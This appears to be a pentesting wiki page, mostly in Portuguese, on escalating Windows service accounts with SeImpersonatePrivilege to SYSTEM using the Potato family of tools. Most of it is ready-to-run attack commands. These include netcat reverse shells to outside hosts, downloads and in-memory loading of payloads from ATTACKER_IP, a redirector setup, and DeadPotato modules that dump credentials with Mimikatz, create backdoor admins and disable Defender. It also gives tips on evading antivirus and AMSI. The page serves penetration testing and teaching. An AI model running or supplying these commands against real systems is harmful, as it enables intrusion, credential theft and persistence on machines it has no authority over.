# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Páginas relacionadas para contexto e técnicas manuais:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos e armadilhas comuns

Todas as técnicas a seguir dependem do abuso de um serviço privilegiado capaz de impersonation a partir de um contexto que possua um destes privilégios:

- SeImpersonatePrivilege (o mais comum) ou SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (típico de muitas contas de serviço como IIS AppPool, MSSQL, etc.)

Verifique privilégios rapidamente:
```cmd
whoami /priv | findstr /i impersonate
```
Notas operacionais:

- Se seu shell estiver sendo executado sob um token restrito sem SeImpersonatePrivilege (comum para Local Service/Network Service em alguns contextos), recupere os privilégios padrão da conta usando FullPowers, então execute um Potato. Exemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- O PrintSpoofer precisa que o serviço Print Spooler esteja em execução e acessível via o endpoint local RPC (spoolss). Em ambientes reforçados onde o Spooler foi desativado após o PrintNightmare, prefira RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- O RoguePotato requer um OXID resolver acessível em TCP/135. Se o egress (tráfego de saída) estiver bloqueado, use um redirector/port-forwarder (veja o exemplo abaixo). Builds mais antigas precisavam da flag -f.
- EfsPotato/SharpEfsPotato abusam do MS-EFSR; se um pipe estiver bloqueado, tente pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
- O erro 0x6d3 durante RpcBindingSetAuthInfo tipicamente indica um serviço de autenticação RPC desconhecido/não suportado; tente um pipe/transporte diferente ou verifique se o serviço alvo está em execução.
- Forks "kitchen-sink" como DeadPotato juntam módulos de payload extras (Mimikatz/SharpHound/Defender off) que escrevem no disco; espere maior detecção por EDR comparado aos originais mais enxutos.

## Demonstração rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Você pode usar -i para iniciar um processo interativo no console atual, ou -c para executar um one-liner.
- Requer o serviço Spooler. Se estiver desativado, isso falhará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se a porta 135 de saída estiver bloqueada, pivot o OXID resolver via socat no seu redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato é uma primitiva de abuso COM mais recente lançada no final de 2022 que mira no serviço **PrintNotify** em vez do Spooler/BITS. O binário instancia o servidor COM do PrintNotify, injeta um `IUnknown` falso e então dispara um callback privilegiado através de `CreatePointerMoniker`. Quando o serviço PrintNotify (rodando como **SYSTEM**) conecta de volta, o processo duplica o token retornado e inicia o payload fornecido com privilégios totais.

Notas operacionais principais:

* Funciona no Windows 10/11 e Windows Server 2012–2022 desde que o serviço Print Workflow/PrintNotify esteja instalado (está presente mesmo quando o Spooler legado é desativado após o PrintNightmare).
* Requer que o contexto de chamada tenha **SeImpersonatePrivilege** (típico para contas de serviço IIS APPPOOL, MSSQL e scheduled-task).
* Aceita um comando direto ou um modo interativo para que você possa permanecer no console original. Exemplo:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Como é puramente baseado em COM, não são necessários listeners de named-pipe ou redirectors externos, tornando-o um substituto pronto para uso em hosts onde o Defender bloqueia o RPC binding do RoguePotato.

Operadores como Ink Dragon disparam o PrintNotifyPotato imediatamente após obter ViewState RCE no SharePoint para pivotar do worker `w3wp.exe` para SYSTEM antes de instalar ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Dica: Se um pipe falhar ou o EDR bloqueá-lo, tente os outros pipes suportados:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Funciona em Windows 8/8.1–11 e Server 2012–2022 quando SeImpersonatePrivilege está presente.
- Pegue o binário que corresponda ao runtime instalado (por exemplo, `GodPotato-NET4.exe` em Server 2022 moderno).
- Se sua execution primitive inicial for um webshell/UI com timeouts curtos, stage o payload como um script e peça ao GodPotato para executá-lo em vez de um comando inline longo.

Padrão rápido de staging a partir de um IIS webroot gravável:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornece duas variantes que visam objetos DCOM de serviço que, por padrão, usam RPC_C_IMP_LEVEL_IMPERSONATE. Construa ou use os binaries fornecidos e execute seu comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork do GodPotato atualizado)

SigmaPotato adiciona melhorias modernas como in-memory execution via .NET reflection e um PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Built-in reverse shell flag `--revshell` and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing payloads in one go.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), plus a rudimentary AV evasion trick via `VirtualAllocExNuma()` to throw off simple heuristics.
- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato keeps the GodPotato OXID/DCOM impersonation chain but bakes in post-exploitation helpers so operators can immediately take SYSTEM and perform persistence/collection without additional tooling.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — executa um comando arbitrário como SYSTEM.
- `-rev <ip:port>` — reverse shell rápida.
- `-newadmin user:pass` — cria um admin local para persistência.
- `-mimi sam|lsa|all` — deposita e executa Mimikatz para extrair credenciais (escreve em disco, ruidoso).
- `-sharphound` — executa a coleta do SharpHound como SYSTEM.
- `-defender off` — desativa a proteção em tempo real do Defender (muito ruidoso).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Como ele traz binários extras, espere mais detecções por AV/EDR; use o GodPotato/SigmaPotato mais enxuto quando stealth for importante.

## Referências

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restaurar privilégios padrão de token para contas de serviço](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → junção NTFS para webroot RCE → FullPowers + GodPotato para SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — macro do LibreOffice → webshell IIS → GodPotato para SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revelando a Relay Network e o funcionamento interno de uma operação ofensiva stealthy](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – rework do GodPotato com módulos post-ex integrados](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
